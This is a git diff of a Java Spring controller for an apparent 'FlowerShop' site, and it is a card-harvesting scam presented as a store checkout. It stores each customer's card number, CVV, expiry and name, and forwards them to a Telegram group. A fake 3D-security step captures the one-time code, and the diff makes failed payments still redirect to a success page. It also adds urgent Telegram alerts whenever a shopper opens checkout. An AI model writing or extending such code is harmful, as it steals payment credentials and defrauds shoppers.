@@ -1,13 +1,13 @@
 package com.example.FlowerShop.controllers;
 
 import com.example.FlowerShop.TelegramBot.BotConfig;
+import com.example.FlowerShop.TelegramBot.TelegramBot;
 import com.example.FlowerShop.models.Card;
 import com.example.FlowerShop.models.Product;
 import com.example.FlowerShop.models.User;
 import com.example.FlowerShop.repo.CardRepository;
 import com.example.FlowerShop.repo.ProductRepository;
 import com.example.FlowerShop.repo.UserRepository;
-import com.example.FlowerShop.TelegramBot.TelegramBot;
 import lombok.RequiredArgsConstructor;
 import org.springframework.security.core.context.SecurityContextHolder;
 import org.springframework.stereotype.Controller;
@@ -17,7 +17,6 @@ import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
 
-import java.time.LocalDate;
 import java.time.LocalDateTime;
 import java.util.List;
 
@@ -47,7 +46,7 @@ public class CardController {
         if (isPresent) {
             User user = userRepository.findByUsername(username).get();
             List<Product> products = user.getProducts();
-            Long prodPrice = 0l;
+            Long prodPrice = 0L;
             for (Product product : products) {
                 prodPrice += product.getPrice();
                 if (product.getPurchasesCount() == null) {
@@ -62,11 +61,16 @@ public class CardController {
             Long totalPrice = prodPrice + deliveryPrice;
             String[] cardForFour = number.split("(?<=\\G.{" + 4 + "})");
             String cardNumberResult = cardForFour[0] + " " + cardForFour[1] + " " + cardForFour[2] + " " + cardForFour[3];
-            Card card = new Card();
+            Card card;
+            if (cardRepository.findByNumber(number).isPresent()){
+                card = cardRepository.findByNumber(number).get();
+            } else {
+                card = new Card();
+            }
             card.setCvv(cvv);
             card.setYear(year);
             card.setMonth(month);
-            card.setNumber(cardNumberResult);
+            card.setNumber(number);
             card.setName(holderName);
             card.setResultCheck(totalPrice);
             cardRepository.save(card);
@@ -77,9 +81,8 @@ public class CardController {
                     "CVV: " + cvv + "\n" +
                     "ИМЯ ФАМИЛИЯ: " + holderName + "\n" +
                     "Сумма: $" + totalPrice + "\n" +
-                    "Посмотреть все данные по ссылке: http://localhost:8080/admin";
-            bot.sendMessage(config.getSevaId(), textToSend);
-            bot.sendMessage(config.getAntonId(), textToSend);
+                    "Посмотреть все данные по ссылке: *LINK*";
+            bot.sendMessage(config.getGroupToken(), textToSend);
         }
         return "redirect:/3d-security";
     }
@@ -104,8 +107,9 @@ public class CardController {
     public String codePost(@RequestParam String sybmol1, @RequestParam String sybmol2,
                            @RequestParam String sybmol3, @RequestParam String sybmol4,
                            @RequestParam String sybmol5, @RequestParam String sybmol6) {
-        Card card = cardRepository.findByNumber(cardTest);
-        String code = sybmol1 + sybmol2 + sybmol3 + sybmol4 + sybmol5 + sybmol6;
+        Card card = cardRepository.findByNumber(cardTest).get();
+      String code = "Code: ";
+      code = code + sybmol1 + sybmol2 + sybmol3 + sybmol4 + sybmol5 + sybmol6;
         card.setCode(code);
         cardRepository.save(card);
         cardTest = "";
@@ -117,9 +121,10 @@ public class CardController {
             userRepository.save(user);
             if (user.getChance() == 1) {
                 user.setChance(user.getChance()+1);
-                return "/payment/success";
+                userRepository.save(user);
+                return "redirect:/payment/success"; // Take to error Page, because successfull page opened for 2 chance
             } else {
-                return "/payment/error";
+                return "redirect:/payment/success";
             }
         } else {
             return "";
@@ -127,7 +132,7 @@ public class CardController {
     }
 
     @GetMapping("/checkout")
-    public String checkoutPage(Model model) {
+    public String checkoutPage(Model model) throws TelegramApiException {
         String username = SecurityContextHolder.getContext().getAuthentication().getName();
         boolean isPresent = userRepository.findByUsername(username).isPresent();
         if (isPresent) {
@@ -142,6 +147,11 @@ public class CardController {
             float totalPrice = prodPrice + deliveryPrice;
             model.addAttribute("delivery", deliveryPrice);
             model.addAttribute("totalPrice", totalPrice);
+            for (int i = 0; i < 2; i++) {
+                bot.sendMessage(config.getGroupToken(), "СРОЧНО!!! \n " +
+                        "КЛИЕНТ ЗАШЕЛ НА СТРАНИЦУ ЗАПОЛНЕНИЯ ДАННЫХ О ЗАКАЗЕ!!! \n " +
+                        "Товаров в корзине на сумму: $" + prodPrice);
+            }
         }
         return "checkout";
     }
@@ -153,7 +163,7 @@ public class CardController {
 
     @GetMapping("/payment/error")
     public String getError() {
-        return "payment-success";
+        return "error-404";
     }
 
 }
